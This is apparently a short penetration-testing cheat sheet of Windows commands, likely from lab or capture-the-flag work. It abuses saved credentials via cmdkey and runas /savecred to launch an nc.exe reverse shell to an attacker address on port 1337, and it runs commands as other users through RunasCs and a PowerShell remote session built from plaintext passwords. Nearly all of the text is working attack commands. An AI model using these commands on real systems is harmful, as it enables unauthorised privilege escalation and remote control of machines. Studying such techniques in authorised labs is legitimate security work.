

```shell
cmdkey /list
```

Execute a command in **Runas**

```shell
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe -e cmd.exe 10.10.14.10 1337"
```



https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1


```shell
Invoke-RunasCs svc_mssql trustno1 'cmd.exe /c whoami'
```


```shell 
PS C:\Users\dave> $password = ConvertTo-SecureString "pwd123" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave>  Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred [CLIENTWK220]:

```